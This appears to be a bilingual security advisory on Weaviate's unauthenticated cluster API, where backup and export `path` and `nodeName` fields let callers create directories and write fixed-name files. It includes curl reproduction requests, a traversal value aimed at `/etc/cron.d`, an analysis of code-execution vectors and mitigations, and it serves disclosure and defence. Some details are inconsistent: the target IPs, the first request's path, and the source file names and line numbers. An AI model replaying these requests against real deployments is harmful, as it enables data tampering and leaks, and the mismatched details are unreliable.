# Weaviate Cluster API — Arbitrary Backup/Export Path Override

<div align="center">

**Research Report** — Version 1.0 — 2026-09-17

Language: [**English**](#1-english) · [**简体中文**](#8-中文)

</div>

---

# 1. English

## 1.1 Overview

| Field              | Value                                                        |
| ------------------ | ------------------------------------------------------------ |
| Affected product   | Weaviate (`semitechnologies/weaviate` container image)       |
| Affected module    | `backup-filesystem` (enabled via `ENABLE_MODULES`), `export` |
| Affected interface | Cluster API, TCP 7947 (`/backups/*`, `/exports/*`)           |
| Tested build       | `1.40.0-rc.0-6843ad7.amd64` (built 2026-09-16)               |
| Test date          | 2026-09-17                                                   |
| Test environment   | `192.168.49.128`, Ubuntu 24.04, Docker 29.1.3, single node, container root |
| PoC                | `poc_weaviate_backup_path.py` (write path probe)             |

## 1.2 Summary

The cluster-internal API listens on all interfaces at `:7947`. When
`CLUSTER_BASIC_AUTH_USERNAME` / `CLUSTER_BASIC_AUTH_PASSWORD` are not configured,
every endpoint of this API is reachable without authentication.

Two request fields are passed unvalidated into node-side filesystem operations:

- `path` in `POST /backups/can-commit` (backup create/restore flow)
- `path` and `nodeName` in `POST /exports/prepare`

The node then performs `os.MkdirAll` and file creation under the supplied path. In
the official container the process runs as uid 0.

Observed results:

1. Arbitrary directories are created and files written under any path chosen by
   the caller (inside the container filesystem).
2. File names are fixed by code templates: `backup.json`, `<class>/chunk-N`,
   `<class>_<shard>_NNNN.parquet`, `node_<nodeName>_status.json`.
3. Information in those files is read back into database objects through the
   restore flow and returned by the REST API.
4. Files whose names do not match the fixed templates (e.g. `authorized_keys`,
   web shell files, cron files) cannot be created or overwritten. No code
   execution was achieved in this audit.

## 1.3 Root cause

Under `res/paths`.. The path delivered by the caller is forwarded to the
filesystem store without validation:

```go
// modules/backup-filesystem/backup.go:27
func (m *Module) resolvePath(overridePath string) (string, error) {
    p := m.backupsPath
    if overridePath != "" {
        p = overridePath
    }
    ...
}

// usecases/backup/handler.go:277
func (m *Handler) OnCanCommit(...) {
    store, err := nodeBackend(nodeName, m.backends, req.Backend, req.ID, req.Bucket, req.Path)
    ...
}

// usecases/export/participant.go:257
backendStore.Initialize(ctx, req.ID, req.Bucket, req.Path)
```

The cluster handler performs no authorization when basic auth is disabled
(`usecls/cluster/state.go` — `BasicAuth.Enabled()` returns false).

## 3. Attack surface

| Path                  | Method | Auth |
| --------------------- | ------ | ---- |
| `/backups/can-commit` | POST   | none |
| `/backups/commit`     | POST   | none |
| `/backups/status`     | POST   | none |
| `/backups/abort`      | POST   | none |
| `/exports/prepare`    | POST   | none |
| `/exports/commit?id=` | POST   | none |
| `/exports/status?id=` | GET    | none |

File name templates (observed and code-verified):

| Artifact        | Template                                         | Ends with      |
| --------------- | ------------------------------------------------ | -------------- |
| backup metadata | `<path>/<id>/<backupID>/backup.json`             | `backup.json`  |
| backup data     | `<path>/<id>/<backupID>/<class>/chunk-N`         | `chunk-N`      |
| export data     | `<path>/<exportID>/<class>_<shard>_NNNN.parquet` | `.parquet`     |
| export status   | `<path>/<exportID>/node_<nodeName>_status.json`  | `_status.json` |

Character sets enforced before any name is used:

| Field      | Validation                                         | Effect                                           |
| ---------- | -------------------------------------------------- | ------------------------------------------------ |
| `backupId` | `^[a-z0-9_-]+$` (`usecases/backup/handler.go:135`) | no `/`, `.`                                      |
| `class`    | `^[A-Z][_0-9A-Za-z]{0,254}$`                       | no `/`, `.`                                      |
| `shard`    | `^[A-Za-z0-9_\\-]{1,64}$`                          | no `/`, `.`                                      |
| `nodeName` | none                                               | dir depth only; `..` removed by `filepath.Clean` |

The export `nodeName` field is used unsanitized in `node_<nodeName>_status.json`.
Observed behavior: `nodeName="../../etc/cron.d/evil"` produced a file at

```
<path>/<exportID>/etc/cron.d/evil_status.json
```

`..` normalization keeps the output inside `<path>`; it cannot escape it, but any
number of intermediate directories can be created.

## 4. Reproduction

Environment: docker container, port mapping `7948:7947` (cluster API),
`8082:8080` (REST API).

```bash
# set cookies not needed; no authentication present
CLUSTER="http://192.168.49.74:7948"
REST="http://192.168.49.74:8082"

# 1. armed backup write
curl -s -X POST "$CLUSTER/backups/can-commit" -H 'Content-Type: application/json' \
  -d '{"method":"create","id":"poc","backend":"filesystem","classes":[],"path":"/tmp/wv"}' 

# expected: 200 {"Method":"create","ID":"poc","Timeout":0,"Err":""}

# 2. trigger
curl -s -X POST "$CLUSTER/backups/commit" -H 'Content-Type: application/json' \
  -d '{"method":"create","id":"poc","backend":"filesystem","path":"/tmp/write"}'

# 3. confirm
curl -s -X POST "$CLUSTER/backups/status" -H 'Content-Type: application/json' \
  -d '{"method":"create","id":"poc","backend":"filesystem","path":"/tmp/write"}'
```

Observed on the host: `/tmp/write/poc/<containerid>/backup.json` exists (JSON,
about 476 bytes, content generated by the server).

Restore chain:

```bash
curl -s -X POST "$CLUSTER/backups/can-commit" -H 'Content-Type: application/json' \
  -d '{"method":"restore","id":"poc","backend":"filesystem","classes":["Class"],"path":"/tmp/victim"}' 
curl -s -X POST "$CLUSTER/backups/commit" -H 'Content-Type: application/json' \
  -d '{"method":"restore","id":"poc","backend":"filesystem","path":"/tmp/victim"}'
```

Observed: objects from the copied backup appear in the REST API
(`GET /v1/objects?class=Class`). `path=/etc` results in
`metadata not found: /etc/<id>/<node>/backup.json` — reads are limited to the
fixed template.

Export chain:

```bash
curl -s -X POST "$CLUSTER/exports/prepare" -H 'Content-Type: application/json' \
  -d '{"id":"e1","backend":"filesystem","classes":["Class"],"shards":{"Class":["<shard>"]},"path":"/tmp/export"}'

curl -s -X POST "$CLUSTER/exports/commit?id=e1"
```

Observed: `/tmp/export/e1/Class_<shard>_0000.parquet` and
`/tmp/export/e1/node__status.json` (191 bytes).

## 5. Capability summary

| Capability                                                   | Requires                         | Effect                                                       |
| ------------------------------------------------------------ | -------------------------------- | ------------------------------------------------------------ |
| create directories anywhere                                  | 1 request (export) or 2 (backup) | disk exhaustion, confuse tooling                             |
| write/overwrite `backup.json`, `chunk-N`, `*.parquet`, `node_*_status.json` | 1–3 requests                     | data tampering, poisoning of any processor that ingests these paths |
| read fixed-layout backup files                               | 2 requests                       | content of backup metadata/data into DB objects (REST-readable) |
| download backup metadata incl. `userBackups` (base64)        | 2 requests                       | informational leak                                           |
| direct RCE                                                   | —                                | not observed; see §6                                         |

## 6. Code-execution analysis

| Vector                                      | Status                                                       |
| ------------------------------------------- | ------------------------------------------------------------ |
| web shell (`.php`, `.jsp`, `.aspx`)         | filename/extension is fixed; `/`, `.` not allowed in `id`, `class`, `shard` |
| `authorized_keys`, `.ssh`                   | filename template does not match                             |
| cron (`/etc/crontabs/root`, `/etc/cron.d/`) | crond not running in container; produced file names not cron syntax |
| overwrite process binary                    | template does not allow writing `/bin/weaviate`              |
| tar path traversal during restore           | blocked by `SanitizeFilePathJoin`; `../ `and absolute paths rejected |
| S3/GCS backend takeover                     | not enabled in the tested deployment                         |

## 7. Impact / mitigation

Without `CLUSTER_BASIC_AUTH_*`:

- Any external host can reach the cluster API and use the writes/reads above.
- The REST API (anonymous mode) allows full CRUD on the database.

Mitigation:

1. Set `CLUSTER_BASIC_AUTH_USERNAME` and `CLUSTER_BASIC_AUTH_PASSWORD`. The node
   handler checks basic auth when these are set.
2. Do not publish ports 7946–7948 outside the cluster network.
3. Set `AUTHENTICATION_ANONYMOUS_ACCESS_ENABLED=false` on the REST API.
4. Constrain `BACKUP_FILESYSTEM_PATH` and add validation that the `path` field
   stays under it (upstream fix).
5. Run the container as a limited user and with a read-only root filesystem;
   avoid bind-mounting the host filesystem.
6. Audit the backup/export roots for names outside the fixed templates.

## 8. Appendices

- `poc_weaviate_backup_path.py` — write-side probe.
- Reproduction steps above.

---

# 2. 中文版

## 2.1 概述

| 项         | 值                                                       |
| ---------- | -------------------------------------------------------- |
| 受影响产品 | Weaviate（`semitechnologies/weaviate` 镜像）             |
| 受影响模块 | `backup-filesystem`（ENABLE_MODULES 启用）、`export`     |
| 受影响接口 | 集群 API（HTTP `:7947`）：`/backups/*`、`/exports/*`     |
| 测试版本   | `1.40.0-rc.0-6843ad7.amd64`（2026-09-16 构建）           |
| 测试日期   | 2026-09-17                                               |
| 测试环境   | `192.168.49.74`：Ubuntu 24.04、Docker 29、单节点容器部署 |
| PoC 文件   | `poc_weaviate_backup_path.py`                            |

## 2.2 摘要

集群内部 API 默认监听所有网卡并以无认证方式提供全部端点（未配置
`CLUSTER_BASIC_AUTH_USERNAME/PASSWORD` 时）。请求中的以下字段未经验证即进入
节点侧文件系统操作：

- 备份流程 `POST /backups/can-commit` 的 `path`
- 导出流程 `POST /exports/prepare` 的 `path` 与 `nodeName`

节点随后在指定路径执行 `os.MkdirAll` 和文件创建/覆盖（容器内以 root 运行）。

实测结论：

1. 可在指定路径下创建任意层级目录并写入文件（容器文件系统内）。
2. 文件名固定为代码模板：`backup.json`、`<class>/chunk-N`、
   `<class>_<shard>_NNNN.parquet`、`node_<name>_status.json`。
3. 可通过 restore 链把固定布局的备份文件内容回灌到数据库对象，并经 REST
   接口读取。
4. 无法创建模板以外的文件名（如 `authorized_keys`、WebShell、cron 文件），
   该链路未形成代码执行。

## 2.3 根因

路径字段直接透传到文件系统存储，未做任何校验：

```go
// modules/backup-filesystem/backup.go:27
func (m *Module) resolvePath(overridePath string) (string, error) {
    p := m.backupsPath
    if overridePath != "" { p = overridePath }
    ...
}

// usecases/backup/handler.go:277
store, err := nodeBackend(nodeName, m.backends, req.Backend, req.ID, req.Bucket, req.Path)

// usecases/export/participant.go:291
backendStore.Initialize(ctx, req.ID, req.Bucket, req.Path)
```

集群 API 在未启用 basic auth 时不做鉴权（`usecases/cluster/state.go` 中
`BasicAuth.Enabled()` 返回 false）。

## 3. 接口面

| 路径                        | 方法 | 鉴权 |
| --------------------------- | ---- | ---- |
| `/backups/can-commit`       | POST | 无   |
| `/backups/commit`           | POST | 无   |
| `/backups/status` / `abort` | POST | 无   |
| `/exports/prepare`          | POST | 无   |
| `/exports/commit?id=`       | POST | 无   |
| `/exports/status?id=`       | GET  | 无   |

可写入的文件名模板：

| 文件                                            | 末尾           | 来源                 |
| ----------------------------------------------- | -------------- | -------------------- |
| `<path>/<id>/<backupID>/backup.json`            | `backup.json`  | 备份元数据           |
| `<path>/<backupID>/<node>/<class>/chunk-N`      | `chunk-N`      | 备份数据（gzip tar） |
| `<path>/<exportID>/<class>_<shard>_NNN.parquet` | `.parquet`     | 导出数据             |
| `<path>/<exportID>/node_<nodeName>_status.json` | `_status.json` | 导出状态             |

名称校验：

| 段         | 正则                         | 效果                                          |
| ---------- | ---------------------------- | --------------------------------------------- |
| `backupId` | `^[a-z0-9_-]+$`              | 无 `.` `/`                                    |
| `class`    | `^[A-Z][_0-9A-Za-z]{0,254}$` | 无 `.` `/`                                    |
| `shard`    | `^[A-Za-z0-9\-_]{1,64}$`     | 无 `.` `/`                                    |
| `nodeName` | 无                           | 仅影响目录层级；`..` 被 `filepath.Clean` 归约 |

`nodeName` 实测（`../../etc/cron.d/evil`）产生：

```
<path>/<exportID>/etc/cron.d/evil_status.json
```

`..` 不能逃出 `<path>` 基线，但可创建任意级目录。

## 4. 复现

```bash
CLUSTER="http://192.168.49.74:7948"; REST="http://192.168.49.74:8082"

curl -s -X POST "$CLUSTER/backups/can-commit" -H 'Content-Type: application/json' \
  -d '{"method":"create","id":"poc","backend":"filesystem","classes":[],"path":"/tmp/write"}'
# → 200 {"Method":"create","ID":"poc","Timeout":0,"Err":""}

curl -s -X POST "$CLUSTER/backups/commit" -H 'Content-Type: application/json' \
  -d '{"method":"create","id":"poc","backend":"filesystem","path":"/tmp/write"}'

curl -s -X POST "$CLUSTER/backups/status" -H 'Content-Type: application/json' \
  -d '{"method":"create","id":"poc","backend":"filesystem","path":"/tmp/write"}'
# → Status: SUCCESS
```

节点侧落盘：`/tmp/write/poc/<容器ID>/backup.json`（约 476 字节 JSON）。

读取链（restore）：

```bash
curl -s -X POST "$CLUSTER/backups/can-commit" -H 'Content-Type: application/json' \
  -d '{"method":"restore","id":"poc","backend":"filesystem","classes":["Class"],"path":"/tmp/victim"}'
curl -s -X POST "$CLUSTER/backups/commit" -H 'Content-Type: application/json' \
  -d '{"method":"restore","id":"poc","backend":"filesystem","path":"/tmp/victim"}'
# GET /v1/objects?class=Class 可见回灌对象
```

导出链：

```bash
curl -s -X POST "$CLUSTER/exports/prepare" -H 'Content-Type: application/json' \
  -d '{"id":"e1","backend":"filesystem","classes":["Class"],"shards":{"Class":["<shard>"]},"path":"/tmp/export"}'
curl -s -X POST "$CLUSTER/exports/commit?id=e1"
# 落盘 /tmp/export/e1/Class_<shard>_0000.parquet 与 node__status.json
```

## 5. 能力矩阵

| 能力                                    | 请求数 | 效果                                           |
| --------------------------------------- | ------ | ---------------------------------------------- |
| 建目录/覆盖固定名文件                   | 1–3    | 磁盘耗尽、数据篡改、对读取该目录的下游服务投毒 |
| 读固定布局备份文件                      | 2      | 备份内容回灌 DB，REST 可查                     |
| 读备份元数据（含 `userBackups` base64） | 2      | 信息泄漏                                       |
| 代码执行（RCE）                         | —      | 未获证（见 §6）                                |

## 6. 代码执行分析

| 路径                          | 结果                                          |
| ----------------------------- | --------------------------------------------- |
| WebShell（`.php` 等）         | 扩展名固定不可控；`id/class/shard` 无 `.` `/` |
| `authorized_keys` / cron 文件 | 文件名模板不匹配                              |
| 覆盖进程二进制                | 模板无法命中 `/bin/weaviate`                  |
| tar 路径穿越                  | `SanitizeFilePathJoin` 拦截 `../` 与绝对路径  |
| S3/GCS 后端 SSRF              | 目标未启用该类后端                            |

## 7. 修复

1. 设置 `CLUSTER_BASIC_AUTH_USERNAME/PASSWORD`，禁止集群 API 匿名访问。
2. 集群端口 7946–7948 仅在集群内网发布。
3. REST 关闭匿名访问（`AUTHENTICATION_ANONYMOUS_ACCESS_ENABLED=false`）。
4. 上游修复：`path`/`nodeName` 字段需校验必须在配置备份根目录内。
5. 容器以非 root 运行、只读根文件系统、不挂载宿主目录。
6. 备份/导出目录巡检模板外文件名。

## 8. 附录

- `poc_weaviate_backup_path.py`（写侧探针）。
- 复现步骤见 §4。
